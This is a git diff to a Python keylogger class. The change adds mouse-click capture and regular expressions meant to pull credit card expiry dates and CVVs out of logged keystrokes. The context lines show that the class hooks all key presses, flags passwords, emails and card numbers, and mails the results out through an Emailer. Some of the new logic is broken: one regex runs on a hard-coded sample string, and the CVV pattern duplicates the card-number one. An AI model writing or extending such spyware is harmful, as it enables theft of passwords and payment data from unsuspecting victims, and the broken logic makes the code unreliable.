@@ -3,8 +3,11 @@ import time
 from emailer import Emailer
 import json
 import re
+from pynput.mouse import Listener
 
 CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
+CREDIT_CARD_EXPIRY_REGEXP = re.compile(CREDIT_CARD_NUMBER_REGEXP.pattern + "[\t]?[0-9]{2}[\t ,\\/]?[0-9]{2}")
+CREDIT_CARD_CVV_REGEXP = re.compile(CREDIT_CARD_NUMBER_REGEXP)
 
 class Keylogger:
     def __init__(self, email: str, password: str) -> None:
@@ -14,7 +17,12 @@ class Keylogger:
         self.local_buffer = ""
         self.local_buffer_raw = ""
         self.shift_keys = 0
-        self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\\n'}
+        self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\n', 'tab': '\t'}
+
+    def __handle_click(self, x, y, mouse_button, pressed):
+        if pressed:
+            self.local_buffer_raw += "!CLICK!"
+            self.local_buffer += "!CLICK!"
 
     # Handles a key pressed by the user and adds it to the local buffer (raw and formatted)
     def __handle_key_press(self, event):
@@ -37,7 +45,9 @@ class Keylogger:
     # Gets any credit card info from the local buffer (credit card number, expiry date, cvv number)
     def __get_credit_card_info(self, buffer: str) -> list:
         credit_card_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
-        
+        credit_card_expiry_dates = re.findall(CREDIT_CARD_EXPIRY_REGEXP, "123456789012\t0622")
+        credit_card_cvv_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
+
         return credit_card_numbers
 
     # Flags the desired information from the buffer (passwords, emails, credit card numbers)
@@ -73,10 +83,10 @@ class Keylogger:
             self.local_buffer_raw = ""
             print("Reset local buffer")
 
-    
-
     def run(self) -> None:
         keyboard.hook(self.__handle_key_press)
+        listener = Listener(on_click=self.__handle_click)
+        listener.start()
 
         emailer = Emailer(self.email, self.password)
         while True:
